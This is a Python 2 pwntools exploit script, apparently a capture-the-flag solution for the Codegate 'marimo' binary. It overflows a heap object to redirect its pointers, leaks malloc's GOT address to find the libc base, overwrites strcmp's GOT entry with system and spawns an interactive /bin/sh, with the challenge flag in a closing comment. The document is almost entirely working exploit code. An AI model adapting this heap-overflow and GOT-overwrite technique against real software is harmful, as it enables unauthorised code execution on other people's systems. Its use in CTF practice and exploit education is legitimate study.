#!/usr/bin/env python2

from pwn import *

###

if len(sys.argv) > 1:
    DEBUG = False
    libc = ELF('libc6_2.23-0ubuntu10_amd64.so')
else:
    DEBUG = True
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

b = ELF('marimo')
context.log_level = 'info'
context.os = 'linux'
context.bits = 64
context.arch = 'amd64'
context.endian = 'little'

###

if DEBUG:
    r = process('./marimo')
else:
    r = remote('ch41l3ng3s.codegate.kr', 3333)

def menu():
    global r
    r.recvuntil('>> ')

def add_marimo(name, profile):
    global r
    r.sendline('show me the marimo')
    r.sendlineafter('>> ', name)
    r.sendlineafter('>> ', profile)
    return menu()

def leak():
    global r
    r.sendline('V')
    r.sendlineafter('>> ', '1')
    d = r.sendlineafter('>> ', 'B')
    m = re.findall('name : (.+)', d)
    leak = u64(m[0].ljust(8, '\x00'))
    menu()
    return leak

menu()

add_marimo('A' * 10, 'A' * 20)
add_marimo('B' * 10, 'B' * 20)

GDB = False
if GDB and DEBUG:
    gdb.attach(r)

log.info('Sleeping 5 seconds to let the marimo grow')
time.sleep(5)

# now we overflow the heap to rewrite the pointers of the 'B' marimo
r.sendline('V') # view
r.sendlineafter('>> ', '0') # bowl 0
r.sendlineafter('>> ', 'M') # modify the morimo
# we leak got.malloc and we will rewrite later the got.strcmp
payload = 'A' * 24 + p64(0) * 2 + p64(0x21) + p64(0xdeadbeef) + p32(b.got['malloc']) + p32(0) + p32(b.got['strcmp'])
r.sendlineafter('>> ', payload)
r.sendlineafter('>> ', 'B')
menu()


# now leaking libc
l = leak()
libcbase = l - libc.symbols['malloc']
system = libcbase + libc.symbols['system']
log.info('leak: %#x' % l)
log.info('libcbase: %#x' % libcbase)
log.info('system: %#x' % system)

#sys.exit()

# rewriting got.strcmp
r.sendline('V') # view
r.sendlineafter('>> ', '1') # bowl 1
r.sendlineafter('>> ', 'M') # modify the morimo
r.sendlineafter('>> ', p64(system)[:-2])
r.sendlineafter('>> ', 'B')
menu()

r.sendline('/bin/sh')

r.interactive()
r.close()

# But_every_cat_is_more_cute_than_Marimo
